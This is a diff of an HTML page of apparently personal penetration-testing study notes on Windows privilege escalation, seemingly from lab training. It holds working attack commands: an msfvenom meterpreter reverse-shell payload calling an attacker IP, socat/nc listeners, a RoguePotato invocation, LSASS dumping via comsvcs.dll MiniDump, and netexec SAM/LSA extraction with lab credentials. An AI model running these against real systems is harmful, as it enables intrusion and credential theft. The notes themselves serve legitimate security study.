@@ -77,14 +77,15 @@
                             <li>You need to have a machine under your control where you can perform the redirect and this machine must be accessible on port 135 by the victim</li>
                             <li>Upload both exe files from the PoC</li>
                         </ul>
-                        <p> Creation of a shell that will be used later </p>
-                        <pre><code class="language-bash">msfvenom -p windows/powershell_reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f raw -o shell.bat</code></pre>
+                        <p> Creation of a shell that will be used later. I recommend you to use nc or even metasploit</p>
+                        <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f exe -o shell.exe</code></pre>
                         <p> Execute that command in attacker machine to capture connection</p>
                         <pre><code class="language-powershell">socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999</code></pre>
                         <p> Execute that command in victim machine</p>
-                        <pre><code class="language-powershell">.\RoguePotato.exe -r VICTIM_IP -e ".\shell.bat" -l 9999</code></pre>
+                        <pre><code class="language-powershell">.\RoguePotato.exe -r VICTIM_IP -e ".\shell.exe" -l 9999</code></pre>
                         <p> Execute that command in attacker machine</p>
                         <pre><code class="language-powershell">nc -lvnp 9999</code></pre>
+                        <b>You can always avoid all this by getting a meterpreter shell and typing "getsystem"</b>
 
                         <h3> Juicy Potatoes</h3>
                         <p>Checkout the list of supported SO for the attack<a class="notion-link" href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md"> here</a></p>
@@ -212,8 +213,28 @@ reg.exe save hklm\security C:\security.save</code></pre>
                         <h3>Alternative ways to do it</h3>
                         <ul>
                             <p>You can automate this process with netexec</p>
-                            <pre><code class="language-powershell">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</code></pre>
                             <pre><code class="language-powershell">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</code></pre>
+                        </ul>    
+                    </ul>
+                </div>
+
+                <div class="notion-body">
+                    <h2 id="Extracting LSASS">Extracting LSASS</h2>
+                    <ul>
+                        <p>You can always export lsass from task manager but it is possible that you land in a host where you only have shell access. In order to extract it perform the following</p>
+                        <p>First identify the PID of lsass</p>
+                        <p>CMD</p>
+                        <pre><code class="language-powershell">tasklist /svc</code></pre>
+                        <p>Powershell</p>
+                        <pre><code class="language-powershell">Get-Process lsass</code></pre>
+                        <p>Now create a dump file</p>    
+                        <pre><code class="language-powershell">rundll32 C:\windows\system32\comsvcs.dll, MiniDump PID C:\lsass.dmp full</code></pre>
+                        
+                        <h3>Alternative ways to do it</h3>
+                        <ul>
+                            <p>You can automate this process with netexec</p>
+                            <pre><code class="language-powershell">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</code></pre>
+                            <p>Or by using a meterpreter shell with the kiwi module loaded</p>
                         </ul>    
                     </ul>
                 </div>
